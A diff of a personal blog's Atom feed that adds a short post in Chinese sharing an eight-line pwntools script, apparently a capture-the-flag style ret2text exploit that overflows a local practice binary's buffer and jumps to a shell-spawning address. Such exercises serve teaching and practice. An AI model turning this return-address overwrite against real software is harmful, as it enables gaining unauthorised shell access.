@@ -6,7 +6,7 @@
   <link href="https://lanternian.com/atom.xml" rel="self"/>
   
   <link href="https://lanternian.com/"/>
-  <updated>2023-11-16T15:35:32.090Z</updated>
+  <updated>2023-11-16T15:39:08.445Z</updated>
   <id>https://lanternian.com/</id>
   
   <author>
@@ -21,8 +21,16 @@
     <link href="https://lanternian.com/2023/11/16/%E4%B8%80%E7%AF%87%E5%B0%8F%E6%96%87%E7%AB%A0/"/>
     <id>https://lanternian.com/2023/11/16/%E4%B8%80%E7%AF%87%E5%B0%8F%E6%96%87%E7%AB%A0/</id>
     <published>2023-11-16T15:35:32.000Z</published>
-    <updated>2023-11-16T15:35:32.090Z</updated>
+    <updated>2023-11-16T15:39:08.445Z</updated>
     
+    <content type="html"><![CDATA[<p>不知道要干什么，贴一个代码吧</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pwnfile = <span class="string">&#x27;./ret2text&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">sh_address = <span class="number">0x4011FB</span></span><br><span class="line">padding = <span class="number">0x28</span></span><br><span class="line">payload = cyclic(padding) + p64(sh_address)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;不知道要干什么，贴一个代码吧&lt;/p&gt;
+&lt;h1 id=&quot;python&quot;&gt;&lt;a href=&quot;#python&quot; class=&quot;headerlink&quot; title=&quot;python&quot;&gt;&lt;/a&gt;python&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;t</summary>
+      
     
     
     
